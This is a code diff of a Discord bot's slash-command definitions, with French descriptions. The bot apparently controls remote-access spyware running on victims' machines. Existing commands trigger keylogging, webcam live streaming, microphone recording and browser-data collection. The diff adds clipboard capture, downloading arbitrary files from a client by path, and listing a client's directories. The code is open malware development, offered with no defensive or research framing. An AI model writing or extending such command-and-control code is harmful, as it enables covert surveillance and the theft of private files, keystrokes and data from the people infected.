@@ -41,8 +41,12 @@ export const commands = [
                         value: 'keylogger',
                     },
                     {
-                        name: 'papier',
-                        value: 'papier',
+                        name: 'clipboard',
+                        value: 'clipboard',
+                    },
+                    {
+                        name: 'downloadfile',
+                        value: 'downloadfile',
                     },
                     {
                         name: 'stop',
@@ -55,11 +59,17 @@ export const commands = [
                 description: 'La durée de l\'enregistrement en secondes (uniquement pour le microphone). Par défaut, 10 secondes.',
                 type: 4,
                 required: false,
+            },
+            {
+                name: 'file_path',
+                description: 'Le chemin du fichier à télécharger (uniquement pour downloadfile).',
+                type: 3,
+                required: false,
             }
         ],
     },
     {
-        name: 'livestream',
+        name: 'live_stream',
         description: 'Diffuse en direct la webcam d\'un client.',
         options: [
             {
@@ -93,7 +103,7 @@ export const commands = [
         ],
     },
     {
-        name: 'listdata',
+        name: 'list_data',
         description: 'Liste les données spécifiques pour un client.',
         options: [
             {
@@ -106,7 +116,8 @@ export const commands = [
                     { name: 'Enregistrements audio', value: 'microphone' },
                     { name: 'Données de navigation', value: 'browserdata' },
                     { name: 'Enregistrements du clavier', value: 'keylogger' },
-                    { name: 'Récuperation presse papier', value: 'papier' }
+                    { name: 'Récuperation presse papier', value: 'clipboard' },
+                    { name: 'Fichiers téléchargés', value: 'downloadfile' }
                 ],
             },
             {
@@ -121,6 +132,24 @@ export const commands = [
             },
         ],
     },
+    {
+        name: 'list_directories_client',
+        description: 'Liste les répertoires pour un client spécifique.',
+        options: [
+            {
+                name: 'client_id',
+                description: 'Le numéro du client.',
+                type: 3,
+                required: true,
+            },
+            {
+                name: 'dir_path',
+                description: 'Le chemin du répertoire.',
+                type: 3,
+                required: true,
+            },
+        ],
+    }
 ];
 
 const rest = new REST({ version: '10' }).setToken(TOKEN);
